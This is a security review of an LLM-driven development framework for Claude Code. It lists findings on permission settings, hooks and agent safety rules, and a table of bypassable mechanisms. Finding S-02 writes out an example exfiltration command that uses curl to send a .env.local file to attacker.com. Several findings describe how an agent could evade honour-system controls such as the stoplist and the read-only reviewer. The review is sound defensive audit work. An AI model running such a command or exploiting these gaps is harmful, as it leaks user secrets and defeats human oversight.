# 06 — Security Review

## Threat model

This is a framework, not a service. It has no authentication, no user data,
and no network surface of its own. Hooks run with the user's filesystem
permissions inside Claude Code; the framework itself stores no secrets.

The interesting attack surface is therefore narrow:

- a user could be tricked by a malicious feature brief into running a
  destructive slash command,
- a hook bug could be coerced into reading or writing files outside its
  intended scope,
- the permission allow-list in `.claude/settings.json` defines what Claude
  Code can do without prompting,
- and the framework's own safety rules (stoplist, READ-ONLY reviewer,
  Stage 4.5b veto) are honour-system unless something programmatic
  enforces them.

`npm audit --omit=dev=false` reports **0 vulnerabilities**. There are no
hardcoded secrets in the repo (`grep -rE "(token|secret|password|api_key|sk-|aws_)"`
returns only doc references and pattern strings used by the security
heuristic).

## Findings

### S-01 — Stoplist enforcement is honour-system — MEDIUM × MEDIUM
**Files:** `.claude/rules/pipeline.md` Stage 0 (lines ~64–77),
`.claude/commands/{quick,nano,config-only}.md`.

`pipeline.md` says the full `/pipeline` track is *mandatory* for changes
that touch authentication, crypto, PII, payments, schema migrations,
feature-flag introduction, or new external dependencies. The orchestrator
is told to default to `/pipeline` on uncertainty.

There is no programmatic check. A user can type `/quick "fix login bug"`
and the framework will route it through the lighter track. Whether the
agent declines and re-routes is a function of how well the orchestrator
follows the rule — not a verifiable invariant.

**Fix:** Add a pre-flight check to `claude-team.js` (and to the slash
commands themselves) that scans the diff for stoplist patterns
(`scripts/security-heuristic.js` already implements the regex set). On
match, reject the lighter track and require `/pipeline`. ~50 LOC. This is
the highest-leverage security fix in the audit.

### S-02 — `Bash(curl *)` allow is unbounded — MEDIUM × HIGH
**File:** `.claude/settings.json:18`.

`Bash(curl *)` is allowed without prompting. A compromised or hostile
agent could exfiltrate via `curl http://attacker.com/?x=$(cat
.env.local)`. The repo contains no `.env`, but consumer projects do.

**Fix:** Two options:
1. Tighten to a narrow allow-list of hostnames (e.g. `Bash(curl
   http://localhost:*)`, `Bash(curl https://api.github.com/*)`,
   `Bash(curl https://registry.npmjs.org/*)`). Most legitimate framework
   uses fall in those buckets.
2. Remove the entry and let Claude Code prompt for curl; it's used rarely
   enough that the friction is acceptable.

Option 1 preserves UX, option 2 is safer; either is an improvement.

### S-03 — `gate-validator.js` swallows all errors as PASS — MEDIUM × MEDIUM
**File:** `.claude/hooks/gate-validator.js` lines ~292–302.

The top-level `catch` logs `[gate-validator] ⚠️ internal error: …;
treating as PASS` and exits 0. The intent is "a bug in the hook should
not halt the user's session." The unintended consequence is that a real
permission error (e.g. `EACCES` on `pipeline/gates/`) silently green-lights
the pipeline.

**Fix:** Distinguish expected absence (no `pipeline/gates/` dir → exit 0)
from unexpected errors (`EACCES`, `EPERM`, malformed JSON we cannot
recover from → exit 1). ~10 LOC of error-class branching.

### S-04 — Budget gate documented but unimplemented — MEDIUM × HIGH
**Files:** `.claude/rules/pipeline.md` Stage 0 (budget block);
`.claude/config.example.yml`; missing `scripts/budget.js`.

The pipeline rules describe writing `pipeline/budget.md` with running
token + wall-clock totals at every stage boundary, with `on_exceed:
escalate` halting the pipeline. There is no script that writes that
file. The escalate behaviour therefore never fires; a runaway pipeline
will exceed the documented limits with no signal.

This is worth filing under security because budget escalation is the
documented mitigation for pipeline-level resource exhaustion.

**Fix:** Port `../codex-dev-team/scripts/budget.js` (~100 LOC, no Codex-
specific deps). Wire `claude-team.js budget {init,update,check}`. Tests
modelled on existing patterns. Same fix as compliance C-02 / quality
Q-01.

### S-05 — `JSON.parse` of gate files has no size cap — LOW × LOW
**Files:** `gate-validator.js` line ~64; `approval-derivation.js` line ~257.

A gate file containing a 1 GB string would consume memory until OOM. An
attacker would already need write access to `pipeline/gates/`; the
practical risk is low, but the cost of capping is also low.

**Fix:** Read with `fs.readFileSync(path, { encoding: 'utf8' })` and
reject if `length > 1_000_000`. ~5 LOC.

### S-06 — Reviewer agent has `Write` in tool list — LOW × HIGH
**File:** `.claude/agents/reviewer.md` frontmatter.

Reviewer is documented as READ-ONLY but has `Write` in `tools` so it can
write `pipeline/code-review/by-<name>.md`. The framework relies on the
agent following the rule about *which paths* it writes. A misbehaving
reviewer agent could in principle write to `src/`.

**Mitigation in place:** `approval-derivation.js` ignores any review file
not under `pipeline/code-review/`, and a Stage-4.5a lint pass would
catch most accidental edits in the next stage. The honour-system gap is
real but bounded.

**Fix:** None required at framework level; flag in the agent prompt that
violation will be caught by the next stage and that approval-derivation
will not credit such writes. (Already noted in the rules; could be
louder in the agent prompt itself.)

### S-07 — Lock-file TOCTOU on stale-lock recovery — LOW × LOW
**File:** `.claude/hooks/approval-derivation.js` ~lines 150–179.

Between `fs.statSync(lockPath)` (age check) and `fs.unlinkSync(lockPath)`
a second process could acquire the lock. The retry loop with
`O_EXCL`-style write provides effective backoff, so the practical risk
is negligible — but the pattern is technically TOCTOU.

**Fix:** Use a per-lock-file rename strategy instead of unlink-then-write,
or document the race window as accepted (the retry loop covers it).

## Bypassable safety mechanisms

| Mechanism | Enforcement | Notes |
|---|---|---|
| Stoplist (full pipeline mandatory for auth/PII/etc.) | Honour-system | See S-01. Should add pre-flight regex. |
| READ-ONLY reviewer | Honour-system + path filter in approval-derivation | See S-06. Bounded but not airtight. |
| Stage 4.5b security veto | **Programmatic** — `gate-validator.js` halts on `veto: true` | Strong. Cannot be overridden by Stage 5 approvals. |
| Bypassed-escalation sweep | **Programmatic** — gate-validator scans every gate | Strong. v2.1 hardening. |
| Two-round review limit | Honour-system in `pipeline.md` | Round counter must survive compaction (called out in `compaction.md`). |
| Approval-derivation single-writer | **Programmatic** — agents that hand-edit `approvals` get overwritten by the hook on the next save | Strong. Closes self-approval loop. |

## Things done well (preserve)

1. **Zero runtime deps** keeps the supply-chain surface near zero.
2. **Bypassed-escalation sweep** — every gate-validator run scans all
   gates, not just the latest. Solves the v2.0 silent-bypass bug.
3. **Approval-derivation as single writer** of stage-05 gates is the
   cleanest closure of the self-approval problem this audit has seen in
   any LLM-driven dev framework.
4. **Veto is non-overridable** — Stage 4.5b `veto: true` halts the
   pipeline regardless of Stage 5 approvals, by gate-validator design.
5. **Permission deny list** explicitly blocks `git push --force`,
   `rm -rf`, and force-push to `origin main`. This is good baseline
   hygiene that many similar frameworks omit.
6. **No secrets, ever.** The framework reads neither tokens nor API keys;
   target projects manage their own.
